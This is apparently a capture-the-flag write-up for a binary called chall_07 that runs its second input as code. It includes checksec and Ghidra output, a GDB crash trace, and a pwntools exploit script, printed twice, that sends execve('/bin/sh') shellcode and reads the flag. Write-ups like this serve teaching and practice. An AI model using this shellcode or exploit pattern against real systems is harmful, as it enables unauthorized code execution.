# &#35; chall_07

#### &#42; execute
```bash
## 1 file
$ ls ./chall_07
./chall_07

$ file ./chall_07
./chall_07: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3aea0db6a24ab96f62e502f367b752413efc125f, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_07
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   68) Symbols	  No	0		2		./chall_07

## just do input twice and try to execute using 2nd input
$ ./chall_07
In the land of raw humanityAAAAAAAA
BBBBBBBB
Segmentation fault



```

#### &#42; disassemble using ghidra
```bash
## vulerable point is fgets(local_d8,200,stdin) and (*(code *)local_d8)();
## need to input shellcode on 2nd input
void main(void)

{
  long in_FS_OFFSET;
  char local_f8 [32];
  undefined local_d8 [200];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("In the land of raw humanity");
  fgets(local_f8,19,stdin);
  fgets(local_d8,200,stdin);
  (*(code *)local_d8)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
}



## exploit structure
local_d8[shellcode]

```


#### &#42; exploit step
```bash
1. 

```



#### &#42; analysis binary using gdb
```bash
## check to execute using BBBBBB
$ gdb ./chall_07 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./chall_07...
(No debugging symbols found in ./chall_07)
gef➤  r
Starting program: /pwn/sunshine/07/chall_07
warning: Error disabling address space randomization: Operation not permitted
In the land of raw humanityAAAAAAAA
BBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe1699d5c0 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x000055b3cfe36220  →  <__libc_csu_init+0> endbr64
$rcx   : 0x000055b3d15cd6b9  →  0x0000000000000000
$rdx   : 0x00007ffe1699d5c0  →  "BBBBBBBB\n"
$rsp   : 0x00007ffe1699d598  →  0x000055b3cfe361fc  →  <main+115> nop
$rbp   : 0x00007ffe1699d690  →  0x0000000000000000
$rsi   : 0xa42424242424242  ("BBBBBBB\n"?)
$rdi   : 0x00007f6468cdb4d0  →  0x0000000000000000
$rip   : 0x00007ffe1699d5c0  →  "BBBBBBBB\n"
$r8    : 0x00007ffe1699d5c0  →  "BBBBBBBB\n"
$r9    : 0x0
$r10   : 0x00007f6468cd8be0  →  0x000055b3d15cdab0  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x000055b3cfe360a0  →  <_start+0> endbr64
$r13   : 0x00007ffe1699d780  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe1699d598│+0x0000: 0x000055b3cfe361fc  →  <main+115> nop 	 ← $rsp
0x00007ffe1699d5a0│+0x0008: "AAAAAAAA\n"
0x00007ffe1699d5a8│+0x0010: 0x000000000000000a
0x00007ffe1699d5b0│+0x0018: 0x0000000000000000
0x00007ffe1699d5b8│+0x0020: 0x0000000000000000
0x00007ffe1699d5c0│+0x0028: "BBBBBBBB\n"	 ← $rdx, $rip, $r8
0x00007ffe1699d5c8│+0x0030: 0x000000000000000a
0x00007ffe1699d5d0│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffe1699d5ba                  add    BYTE PTR [rax], al
   0x7ffe1699d5bc                  add    BYTE PTR [rax], al
   0x7ffe1699d5be                  add    BYTE PTR [rax], al
 → 0x7ffe1699d5c0                  rex.X
   0x7ffe1699d5c1                  rex.X
   0x7ffe1699d5c2                  rex.X
   0x7ffe1699d5c3                  rex.X
   0x7ffe1699d5c4                  rex.X
   0x7ffe1699d5c5                  rex.X
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_07", stopped 0x7ffe1699d5c0 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffe1699d5c0 → rex.X
[#1] 0x55b3cfe361fc → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤



```

#### &#42; structure of stack
```bash
local_d8 = shellocde



```

#### &#42; payload(python)
```python
conn.sendline("dummy")
conn.sendline(shellocde)


```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

#context.log_level='debug'

filename="./chall_07"
conn = process(filename)

#print( conn.recvuntil("raw humanity") )
#print( conn.recvline() )
conn.sendline(b"A"*8)

shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"

conn.sendline(shellcode)

conn.interactive()
user@pwn:/pwn/sunshine/07$ cat exp.py
from pwn import *

#context.log_level='debug'

filename="./chall_07"
conn = process(filename)

#print( conn.recvuntil("raw humanity") )
#print( conn.recvline() )
conn.sendline(b"A"*8)

shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"

conn.sendline(shellcode)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_07': pid 3471
[*] Switching to interactive mode
$
$ cat flag.txt
sun{sidewinder-a80d0be1840663c4}
$

```